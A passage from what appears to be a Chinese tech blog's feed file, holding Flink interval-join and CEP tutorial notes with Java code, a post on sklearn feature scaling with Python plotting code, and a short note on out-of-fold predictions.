org.apache.flink.streaming.api.functions.timestamps.AscendingTimestampExtractor;</span><br><span class="line"><span class="keyword">import</span> org.apache.flink.streaming.api.functions.timestamps.BoundedOutOfOrdernessTimestampExtractor;</span><br><span class="line"><span class="keyword">import</span> org.apache.flink.streaming.api.windowing.time.Time;</span><br><span class="line"><span class="keyword">import</span> org.apache.flink.streaming.runtime.operators.util.AssignerWithPeriodicWatermarksAdapter;</span><br><span class="line"><span class="keyword">import</span> org.apache.flink.util.Collector;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.net.URL;</span><br><span class="line"><span class="keyword">import</span> java.util.concurrent.TimeUnit;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@author</span> : Ashiamd email: ashiamd@foxmail.com</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@date</span> : 2021/2/6 7:55 PM</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">TxPayMatchByJoin</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">  <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">    StreamExecutionEnvironment env = StreamExecutionEnvironment.getExecutionEnvironment();</span><br><span class="line">    env.setStreamTimeCharacteristic(TimeCharacteristic.EventTime);</span><br><span class="line">    env.setParallelism(<span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 读取数据并转换成POJO类型</span></span><br><span class="line">    <span class="comment">// 读取订单支付事件数据</span></span><br><span class="line">    URL orderResource = TxPayMatch.class.getResource(<span class="string">&quot;/OrderLog.csv&quot;</span>);</span><br><span class="line">    DataStream&lt;OrderEvent&gt; orderEventStream = env.readTextFile(orderResource.getPath())</span><br><span class="line">      .map(line -&gt; &#123;</span><br><span class="line">        String[] fields = line.split(<span class="string">&quot;,&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">new</span> OrderEvent(<span class="keyword">new</span> Long(fields[<span class="number">0</span>]), fields[<span class="number">1</span>], fields[<span class="number">2</span>], <span class="keyword">new</span> Long(fields[<span class="number">3</span>]));</span><br><span class="line">      &#125;)</span><br><span class="line">      .assignTimestampsAndWatermarks(<span class="keyword">new</span> AssignerWithPeriodicWatermarksAdapter.Strategy&lt;&gt;(</span><br><span class="line">        <span class="keyword">new</span> BoundedOutOfOrdernessTimestampExtractor&lt;OrderEvent&gt;(Time.of(<span class="number">200</span>, TimeUnit.MILLISECONDS)) &#123;</span><br><span class="line">          <span class="meta">@Override</span></span><br><span class="line">          <span class="function"><span class="keyword">public</span> <span class="keyword">long</span> <span class="title">extractTimestamp</span><span class="params">(OrderEvent element)</span> </span>&#123;</span><br><span class="line">            <span class="keyword">return</span> element.getTimestamp() * <span class="number">1000L</span>;</span><br><span class="line">          &#125;</span><br><span class="line">        &#125;</span><br><span class="line">      ))</span><br><span class="line">      <span class="comment">// 交易id不为空，必须是pay事件</span></span><br><span class="line">      .filter(data -&gt; !<span class="string">&quot;&quot;</span>.equals(data.getTxId()));</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 读取到账事件数据</span></span><br><span class="line">    URL receiptResource = TxPayMatch.class.getResource(<span class="string">&quot;/ReceiptLog.csv&quot;</span>);</span><br><span class="line">    SingleOutputStreamOperator&lt;ReceiptEvent&gt; receiptEventStream = env.readTextFile(receiptResource.getPath())</span><br><span class="line">      .map(line -&gt; &#123;</span><br><span class="line">        String[] fields = line.split(<span class="string">&quot;,&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">new</span> ReceiptEvent(fields[<span class="number">0</span>], fields[<span class="number">1</span>], <span class="keyword">new</span> Long(fields[<span class="number">2</span>]));</span><br><span class="line">      &#125;)</span><br><span class="line">      .assignTimestampsAndWatermarks(<span class="keyword">new</span> AssignerWithPeriodicWatermarksAdapter.Strategy&lt;&gt;(</span><br><span class="line">        <span class="keyword">new</span> BoundedOutOfOrdernessTimestampExtractor&lt;ReceiptEvent&gt;(Time.of(<span class="number">200</span>, TimeUnit.MILLISECONDS)) &#123;</span><br><span class="line">          <span class="meta">@Override</span></span><br><span class="line">          <span class="function"><span class="keyword">public</span> <span class="keyword">long</span> <span class="title">extractTimestamp</span><span class="params">(ReceiptEvent element)</span> </span>&#123;</span><br><span class="line">            <span class="keyword">return</span> element.getTimestamp() * <span class="number">1000L</span>;</span><br><span class="line">          &#125;</span><br><span class="line">        &#125;</span><br><span class="line">      ));</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 区间连接两条流，得到匹配的数据</span></span><br><span class="line">    SingleOutputStreamOperator&lt;Tuple2&lt;OrderEvent, ReceiptEvent&gt;&gt; resultStream = orderEventStream</span><br><span class="line">      .keyBy(OrderEvent::getTxId)</span><br><span class="line">      .intervalJoin(receiptEventStream.keyBy(ReceiptEvent::getTxId))</span><br><span class="line">      .between(Time.seconds(-<span class="number">3</span>), Time.seconds(<span class="number">5</span>))    <span class="comment">// -3，5 区间范围</span></span><br><span class="line">      .process(<span class="keyword">new</span> TxPayMatchDetectByJoin());</span><br><span class="line"></span><br><span class="line">    resultStream.print();</span><br><span class="line"></span><br><span class="line">    env.execute(<span class="string">&quot;tx pay match by join job&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// 实现自定义ProcessJoinFunction</span></span><br><span class="line">  <span class="keyword">public</span> <span class="keyword">static</span> <span class="class"><span class="keyword">class</span> <span class="title">TxPayMatchDetectByJoin</span> <span class="keyword">extends</span> <span class="title">ProcessJoinFunction</span>&lt;<span class="title">OrderEvent</span>, <span class="title">ReceiptEvent</span>, <span class="title">Tuple2</span>&lt;<span class="title">OrderEvent</span>, <span class="title">ReceiptEvent</span>&gt;&gt; </span>&#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">processElement</span><span class="params">(OrderEvent left, ReceiptEvent right, Context ctx, Collector&lt;Tuple2&lt;OrderEvent, ReceiptEvent&gt;&gt; out)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">      out.collect(<span class="keyword">new</span> Tuple2&lt;&gt;(left, right));</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li><p> 输出  </p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">(OrderEvent&#123;orderId=34729, eventType=&#x27;pay&#x27;, txId=&#x27;sd76f87d6&#x27;, timestamp=1558430844&#125;,ReceiptEvent&#123;txId=&#x27;sd76f87d6&#x27;, payChannel=&#x27;wechat&#x27;, timestamp=1558430847&#125;)</span><br><span class="line">(OrderEvent&#123;orderId=34730, eventType=&#x27;pay&#x27;, txId=&#x27;3hu3k2432&#x27;, timestamp=1558430845&#125;,ReceiptEvent&#123;txId=&#x27;3hu3k2432&#x27;, payChannel=&#x27;alipay&#x27;, timestamp=1558430848&#125;)</span><br><span class="line">(OrderEvent&#123;orderId=34746, eventType=&#x27;pay&#x27;, txId=&#x27;3243hr9h9&#x27;, timestamp=1558430895&#125;,ReceiptEvent&#123;txId=&#x27;3243hr9h9&#x27;, payChannel=&#x27;wechat&#x27;, timestamp=1558430892&#125;)</span><br><span class="line">(OrderEvent&#123;orderId=34747, eventType=&#x27;pay&#x27;, txId=&#x27;329d09f9f&#x27;, timestamp=1558430893&#125;,ReceiptEvent&#123;txId=&#x27;329d09f9f&#x27;, payChannel=&#x27;alipay&#x27;, timestamp=1558430893&#125;)</span><br></pre></td></tr></table></figure></li></ul><h3 id="CEP"><a href="#CEP" class="headerlink" title="CEP"></a>CEP</h3><blockquote><p><a href="https://zhuanlan.zhihu.com/p/43448829">Flink-复杂事件（CEP）</a></p><p><a href="https://blog.csdn.net/qq_37135484/article/details/106327567">Flink之CEP(复杂时间处理)</a></p></blockquote><h4 id="基本概念"><a href="#基本概念" class="headerlink" title="基本概念"></a>基本概念</h4><h5 id="什么是CEP"><a href="#什么是CEP" class="headerlink" title="什么是CEP"></a>什么是CEP</h5><ul><li> 复杂事件处理（Complex Event Processing，CEP） </li><li> Flink CEP是在Flink中实现的复杂事件处理（CEP）库 </li><li> CEP允许在<strong>无休止的事件流</strong>中检测事件模式，让我们有机会掌握数据中重要的部分 </li><li> <strong>一个或多个由简单事件构成的事件流通过一定的规则匹配，然后输出用户想得到的数据——满足规则的复杂事件</strong> </li></ul><h5 id="CEP特点"><a href="#CEP特点" class="headerlink" title="CEP特点"></a>CEP特点</h5><p><img src="https://pic1.zhimg.com/80/v2-1c7057bda8a3ba077a3b8059f35d9bc4_1440w.jpg###id=O7Ztz&originHeight=441&originWidth=942&originalType=binary&ratio=1&status=done&style=none"></p><ul><li>目标：从有序的简单事件流中发现一些高阶特征</li></ul><ul><li> 输入：一个或多个由简单事件构成的事件流 </li><li> 处理：识别简单事件之间的内在联系，多个符合一定规则的简单事件构成复杂事件 </li><li> 输出：满足规则的复杂事件 </li></ul><h4 id="Pattern-API"><a href="#Pattern-API" class="headerlink" title="Pattern API"></a>Pattern API</h4><ul><li> 处理事件的规则，被叫做”模式”（Pattern） </li><li> Flink CEP提供了Pattern API，用于对输入流数据进行复杂事件规则定义，用来提取符合规则的时间序列  <figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">DataStream&lt;Event&gt; input = ...</span><br><span class="line"><span class="comment">// 定义一个Pattern</span></span><br><span class="line">Pattern&lt;Event, Event&gt; pattern = Pattern.&lt;Event&gt;begin(<span class="string">&quot;start&quot;</span>).where(...)</span><br><span class="line">  .next(<span class="string">&quot;middle&quot;</span>).subtype(SubEvent.class).where(...)</span><br><span class="line">  .followedBy(<span class="string">&quot;end&quot;</span>).where(...);</span><br><span class="line"><span class="comment">// 将创建好的Pattern应用到输入事件流上</span></span><br><span class="line">PatternStream&lt;Event&gt; patternStream = CEP.pattern(input,pattern);</span><br><span class="line"><span class="comment">// 检出匹配事件序列，处理得到结果</span></span><br><span class="line">DataStream&lt;Alert&gt; result = patternStream.select(...);</span><br></pre></td></tr></table></figure></li></ul><h5 id="个体模式-Individual-Patterns"><a href="#个体模式-Individual-Patterns" class="headerlink" title="个体模式(Individual Patterns)"></a>个体模式(Individual Patterns)</h5><ul><li><p> 组成复杂规则的每一个单独的模式定义,就是”个体模式”  </p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">start.times(<span class="number">3</span>).where(<span class="keyword">new</span> SimpleCondition&lt;Event&gt;() &#123;...&#125;)</span><br></pre></td></tr></table></figure></li><li><p> 个体模式可以包括”单例(singleton)模式”和”循环(looping)模式” </p></li><li><p> 单例模式只接收一个事件，而循环模式可以接收多个 </p></li></ul><hr><ul><li><p> 量词（Quantifier）<br>可以在一个个体模式后追加量词，也就是指定循环次数  </p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//匹配出现4次</span></span><br><span class="line">start.times(<span class="number">4</span>)</span><br><span class="line"><span class="comment">//匹配出现2/3/4次</span></span><br><span class="line">start.time(<span class="number">2</span>,<span class="number">4</span>).greedy</span><br><span class="line"><span class="comment">//匹配出现0或者4次</span></span><br><span class="line">start.times(<span class="number">4</span>).optional</span><br><span class="line"><span class="comment">//匹配出现1次或者多次</span></span><br><span class="line">start.oneOrMore</span><br><span class="line"><span class="comment">//匹配出现2,3,4次</span></span><br><span class="line">start.times(<span class="number">2</span>,<span class="number">4</span>)</span><br><span class="line"><span class="comment">//匹配出现0次,2次或者多次,并且尽可能多的重复匹配</span></span><br><span class="line">start.timesOrMore(<span class="number">2</span>),optional.greedy</span><br></pre></td></tr></table></figure></li><li><p>条件（Condition） </p><ul><li><p> <strong>每个模式都需要指定触发条件</strong>，作为模式是否接受事件进入的判断依据 </p></li><li><p> CEP中的个体模式主要通过调用<code>.where()</code>，<code>.or()</code>和<code>.until()</code>来指定条件 </p></li><li><p>按不同的调用方式，可以分成以下几类 </p><ul><li><p> 简单条件（Simple Condition）<br>通过<code>.where()</code>方法对事件中的字段进行判断筛选，决定是否接受该事件  </p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">start.where(<span class="keyword">new</span> SimpleCondition&lt;Event&gt;)&#123;</span><br><span class="line">  <span class="meta">@Override</span></span><br><span class="line">  <span class="function"><span class="keyword">public</span> <span class="keyword">boolean</span> <span class="title">filter</span><span class="params">(Event value)</span> <span class="keyword">throws</span> Exception</span>&#123;</span><br><span class="line">    <span class="keyword">return</span> value.getName.startsWith(<span class="string">&quot;foo&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li><p> 组合条件（Combining Condition）<br>将简单条件进行合并；<code>.or()</code>方法表示或逻辑相连，where的直接组合就是AND<br><code>pattern.where(event =&gt; ... /* some condition */).or(event =&gt; ... /* or condition */)</code> </p></li><li><p> 终止条件（Stop Condition）<br>如果使用了<code>oneOrMore</code>或者<code>oneOrMore.optional</code>，建议使用<code>.until()</code>作为终止条件，以便清理状态 </p></li><li><p> 迭代条件（Iterative Condition）<br>能够对模式之前所有接收的事件进行处理<br>可以调用<code>ctx.getEventsForPattern(&quot;name&quot;)</code>  </p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">.where(<span class="keyword">new</span> IterativeCondition&lt;Event&gt;()&#123;...&#125;)</span><br></pre></td></tr></table></figure></li></ul></li></ul></li></ul><h5 id="组合模式-Combining-Patterns"><a href="#组合模式-Combining-Patterns" class="headerlink" title="组合模式(Combining Patterns)"></a>组合模式(Combining Patterns)</h5><p>组合模式(Combining Patterns)也叫模式序列。</p><ul><li> 很多个体模式组合起来，就形成了整个的模式序列 </li><li> 模式序列必须以一个”初始模式”开始  <figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Pattern&lt;Event, Event&gt; start = Pattern.&lt;Event&gt;begin(<span class="string">&quot;start&quot;</span>)</span><br></pre></td></tr></table></figure></li></ul><p><img src="https://img-blog.csdnimg.cn/20200526221919332.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM3MTM1NDg0,size_16,color_FFFFFF,t_70###id=o5YAt&originHeight=472&originWidth=559&originalType=binary&ratio=1&status=done&style=none"></p><ul><li>严格近邻(Strict Contiguity) <ul><li><strong>所有事件按照严格的顺序出现</strong>，中间没有任何不匹配的事件，由<code>.next()</code>指定</li><li>例如对于模式”a next b”,事件序列[a,c,b1,b2]没有匹配</li></ul></li><li>宽松近邻(Relaxed Contiguity) <ul><li>允许中间出现不匹配的事件,由<code>.followedBy()</code>指定</li><li>例如对于模式”a followedBy b”,事件序列[a,c,b1,b2]匹配为[a,b1]</li></ul></li><li>非确定性宽松近邻(Non-Deterministic Relaxed Contiguity) <ul><li>进一步放宽条件,之前已经匹配过的事件也可以再次使用，由<code>.followByAny()</code>指定</li><li>例如对于模式”a followedAny b”,事件序列[a,c,b1,b2]匹配为{a,b1},{a,b2}</li></ul></li><li>除了以上模式序列外,还可以定义”不希望出现某种近邻关系”: <ul><li> <code>.notNext()</code> 不严格近邻 </li><li> <code>.notFollowedBy()</code>不在两个事件之间发生<br>（eg，a not FollowedBy c，a Followed By b，a希望之后出现b，且不希望ab之间出现c） </li></ul></li><li>需要注意： <ul><li> <strong>所有模式序列必须以</strong><code>**.begin()**</code><strong>开始</strong> </li><li> <strong>模式序列不能以</strong><code>**.notFollowedBy()**</code><strong>结束</strong> </li><li> <strong>“not “类型的模式不能被optional 所修饰</strong> </li><li> 此外,还可以为模式指定事件约束，用来要求在多长时间内匹配有效: </li></ul></li></ul><p><code>next.within(Time.seconds(10))</code></p><h5 id="模式组-Groups-of-patterns"><a href="#模式组-Groups-of-patterns" class="headerlink" title="模式组(Groups of patterns)"></a>模式组(Groups of patterns)</h5><ul><li>将一个模式序列作为条件嵌套在个体模式里，成为一组模式</li></ul><h4 id="模式的检测"><a href="#模式的检测" class="headerlink" title="模式的检测"></a>模式的检测</h4><ul><li> 指定要查找的模式序列后，就可以将其应用于输入流以检测潜在匹配 </li><li> 调用<code>CEP.pattern()</code>，给定输入流和模式，就能得到一个PatternStream  <figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">DataStream&lt;Event&gt; input = ...</span><br><span class="line">Pattern&lt;Event, Event&gt; pattern = Pattern.&lt;Event&gt;begin(<span class="string">&quot;start&quot;</span>).where(...)...</span><br><span class="line"></span><br><span class="line">PatternStream&lt;Event&gt; patternStream = CEP.pattern(input, pattern);</span><br></pre></td></tr></table></figure></li></ul><h4 id="匹配事件的提取"><a href="#匹配事件的提取" class="headerlink" title="匹配事件的提取"></a>匹配事件的提取</h4><ul><li> 创建PatternStrean之后，就可以应用select或者flatselect方法，从检测到的事件序列中提取事件了 </li><li> <code>select()</code>方法需要输入一个select function作为参数,每个成功匹配的事件序列都会调用它 </li><li> <code>select()</code> 以一个Map&lt;String，List&lt;IN]&gt;&gt; 来接收匹配到的事件序列，其中Key就是每个模式的名称，而value就是所有接收到的事件的List类型  <figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> OUT <span class="title">select</span><span class="params">(Map&lt;String, List&lt;IN&gt;&gt; pattern)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">  IN startEvent = pattern.get(<span class="string">&quot;start&quot;</span>).get(<span class="number">0</span>);</span><br><span class="line">  IN endEvent = pattern.get(<span class="string">&quot;end&quot;</span>).get(<span class="number">0</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="keyword">new</span> OUT(startEvent, endEvent);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li></ul><h4 id="超时事件的提取"><a href="#超时事件的提取" class="headerlink" title="超时事件的提取"></a>超时事件的提取</h4><ul><li> <strong>当一个模式通过within关键字定义了检测窗口时间时，部分事件序列可能因为超过窗口长度而被丢弃；为了能够处理这些超时的部分匹配，select和flatSelect API调用允许指定超时处理程序</strong> </li><li> <strong>超时处理程序会接收到目前为止由模式匹配到的所有事件，由一个OutputTag定义接收到的超时事件序列</strong>  <figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">PatternStream&lt;Event&gt; patternStream = CEP.pattern(input, pattern);</span><br><span class="line">OutputTag&lt;String&gt; outputTag = <span class="keyword">new</span> OutputTag&lt;String&gt;(<span class="string">&quot;side-output&quot;</span>)&#123;&#125;;</span><br><span class="line"></span><br><span class="line">SingleOutputStreamOperator&lt;ComplexEvent&gt; flatResult = </span><br><span class="line">  patternStream.flatSelect(</span><br><span class="line">  outputTag,</span><br><span class="line">  <span class="keyword">new</span> PatternFlatTimeoutFunction&lt;Event, TimeoutEvent&gt;() &#123;...&#125;,</span><br><span class="line">  <span class="keyword">new</span> PatternFlatSelectFunction&lt;Event, ComplexEvent&gt;() &#123;...&#125;</span><br><span class="line">);</span><br><span class="line">DataStream&lt;TimeoutEvent&gt; timeoutFlatResult = </span><br><span class="line">  flatResult.getSideOutput(outputTag);</span><br></pre></td></tr></table></figure></li></ul>]]></content>
      
      
      <categories>
          
          <category> BigData </category>
          
      </categories>
      
      
        <tags>
            
            <tag> flink </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>什么是数据标准化</title>
      <link href="/2021/08/13/%E4%BB%80%E4%B9%88%E6%98%AF%E6%95%B0%E6%8D%AE%E6%A0%87%E5%87%86%E5%8C%96/"/>
      <url>/2021/08/13/%E4%BB%80%E4%B9%88%E6%98%AF%E6%95%B0%E6%8D%AE%E6%A0%87%E5%87%86%E5%8C%96/</url>
      
        <content type="html"><![CDATA[<h2 id="定义"><a href="#定义" class="headerlink" title="定义"></a>定义</h2><p>通常来说，它们都是指特征工程中的特征缩放过程，由于中文翻译的原因，网上对它们的解释也是五花八门，但其实我们不考虑它们的名字，直接看它们的作用和操作方法，可能会更容易理解。<br>使用特征缩放的作用是：</p><ol><li>使不同量纲的特征处于同一数值量级，减少方差大的特征的影响，使模型更准确。</li><li>加快学习算法的收敛速度。</li></ol><p>参考sklearn的官方文档的数据预处理章节，<br><a href="https://link.zhihu.com/?target=https://scikit-learn.org/stable/modules/preprocessing.html">5.3. Preprocessing datascikit-learn.org/stable/modules/preprocessing.html</a><br>缩放过程可以分为以下几种：</p><ol><li>缩放到均值为0，方差为1（<strong>Standardization——</strong>StandardScaler()）</li><li>缩放到0和1之间（<strong>Standardization——</strong>MinMaxScaler()）</li><li>缩放到-1和1之间（<strong>Standardization——</strong>MaxAbsScaler()）</li><li>缩放到0和1之间，保留原始数据的分布（<strong>Normalization——</strong>Normalizer()）</li></ol><p>1就是常说的z-score归一化，2是min-max归一化。<br>举个例子来看看它们之间的区别，假设一个数据集包括「身高」和「体重」两个特征，它们都满足正态分布，画出原始数据图像为：<br><img src="http://106.12.125.218/medias/medias/%E4%BB%80%E4%B9%88%E6%98%AF%E6%95%B0%E6%8D%AE%E6%A0%87%E5%87%86%E5%8C%96/0.png"><br>使用1.StandardScaler()缩放，结果为：<br><img src="http://106.12.125.218/medias/medias/%E4%BB%80%E4%B9%88%E6%98%AF%E6%95%B0%E6%8D%AE%E6%A0%87%E5%87%86%E5%8C%96/1.png"><br>使用2.MinMaxScaler()缩放，结果为：<br><img src="http://106.12.125.218/medias/medias/%E4%BB%80%E4%B9%88%E6%98%AF%E6%95%B0%E6%8D%AE%E6%A0%87%E5%87%86%E5%8C%96/2.png"><br>使用3.MaxAbsScaler()缩放，结果为：<br><img src="http://106.12.125.218/medias/medias/%E4%BB%80%E4%B9%88%E6%98%AF%E6%95%B0%E6%8D%AE%E6%A0%87%E5%87%86%E5%8C%96/3.png"><br>使用4.Normalizer()缩放，结果为：<br><img src="http://106.12.125.218/medias/medias/%E4%BB%80%E4%B9%88%E6%98%AF%E6%95%B0%E6%8D%AE%E6%A0%87%E5%87%86%E5%8C%96/4.png"><br>按需选择。<br>附：</p><h2 id="实现"><a href="#实现" class="headerlink" title="实现"></a>实现</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> numpy <span class="keyword">as</span> np</span><br><span class="line"><span class="keyword">import</span> matplotlib.pyplot <span class="keyword">as</span> plt</span><br><span class="line"><span class="keyword">import</span> seaborn <span class="keyword">as</span> sns</span><br><span class="line"><span class="keyword">from</span> sklearn <span class="keyword">import</span> preprocessing</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">plot</span>(<span class="params">data, title</span>):</span></span><br><span class="line">    sns.set_style(<span class="string">&#x27;dark&#x27;</span>)</span><br><span class="line">    f, ax = plt.subplots()</span><br><span class="line">    ax.<span class="built_in">set</span>(ylabel=<span class="string">&#x27;frequency&#x27;</span>)</span><br><span class="line">    ax.<span class="built_in">set</span>(xlabel=<span class="string">&#x27;height(blue) / weight(green)&#x27;</span>)</span><br><span class="line">    ax.<span class="built_in">set</span>(title=title)</span><br><span class="line">    sns.distplot(data[:, <span class="number">0</span>:<span class="number">1</span>], color=<span class="string">&#x27;blue&#x27;</span>)</span><br><span class="line">    sns.distplot(data[:, <span class="number">1</span>:<span class="number">2</span>], color=<span class="string">&#x27;green&#x27;</span>)</span><br><span class="line">    plt.savefig(title + <span class="string">&#x27;.png&#x27;</span>)</span><br><span class="line">    plt.show()</span><br><span class="line"></span><br><span class="line">np.random.seed(<span class="number">42</span>)</span><br><span class="line">height = np.random.normal(loc=<span class="number">168</span>, scale=<span class="number">5</span>, size=<span class="number">1000</span>).reshape(-<span class="number">1</span>, <span class="number">1</span>)</span><br><span class="line">weight = np.random.normal(loc=<span class="number">70</span>, scale=<span class="number">10</span>, size=<span class="number">1000</span>).reshape(-<span class="number">1</span>, <span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">original_data = np.concatenate((height, weight), axis=<span class="number">1</span>)</span><br><span class="line">plot(original_data, <span class="string">&#x27;Original&#x27;</span>)</span><br><span class="line"></span><br><span class="line">standard_scaler_data = preprocessing.StandardScaler().fit_transform(original_data)</span><br><span class="line">plot(standard_scaler_data, <span class="string">&#x27;StandardScaler&#x27;</span>)</span><br><span class="line"></span><br><span class="line">min_max_scaler_data = preprocessing.MinMaxScaler().fit_transform(original_data)</span><br><span class="line">plot(min_max_scaler_data, <span class="string">&#x27;MinMaxScaler&#x27;</span>)</span><br><span class="line"></span><br><span class="line">max_abs_scaler_data = preprocessing.MaxAbsScaler().fit_transform(original_data)</span><br><span class="line">plot(max_abs_scaler_data, <span class="string">&#x27;MaxAbsScaler&#x27;</span>)</span><br><span class="line"></span><br><span class="line">normalizer_data = preprocessing.Normalizer().fit_transform(original_data)</span><br><span class="line">plot(normalizer_data, <span class="string">&#x27;Normalizer&#x27;</span>)</span><br><span class="line"></span><br><span class="line">robust_scaler_data = preprocessing.RobustScaler().fit_transform(original_data)</span><br><span class="line">plot(robust_scaler_data, <span class="string">&#x27;RobustScaler&#x27;</span>)</span><br></pre></td></tr></table></figure><h2 id="来源"><a href="#来源" class="headerlink" title="来源"></a>来源</h2><p>​<a href="https://www.zhihu.com/question/20467170/answer/839255695">https://www.zhihu.com/question/20467170/answer/839255695</a></p>]]></content>
      
      
      <categories>
          
          <category> ML </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ml </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>什么是oof_predictions</title>
      <link href="/2021/08/09/%E4%BB%80%E4%B9%88%E6%98%AFoof_predictions/"/>
      <url>/2021/08/09/%E4%BB%80%E4%B9%88%E6%98%AFoof_predictions/</url>
      
        <content type="html"><![CDATA[<blockquote><p>oof = out of fold</p></blockquote><p>  一句话就是，进行10折验证的时候，假如训练集1000条：</p><ul><li>十折cv，10个模型，每个模型都是由900条训练集训练而成，对剩下的100条进行预测，10个模型都对各自剩下的100条进行预测，这个就叫做OOF predictions.</li></ul>]]></content>
      
      
      <categories>
          
          <category> DL </category>
          
      </categories>
      
      
        <tags>
            
            <tag> dl </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Python标准库logging教程</title>
      <link href="/2021/08/08/Python%E6%A0%87%E5%87%86%E5%BA%93logging%E6%95%99%E7%A8%8B/"/>
      <url>/2021/08/08/Python%E6%A0%87%E5%87%86%E5%BA%93logging%E6%95%99%E7%A8%8B/</url>
      
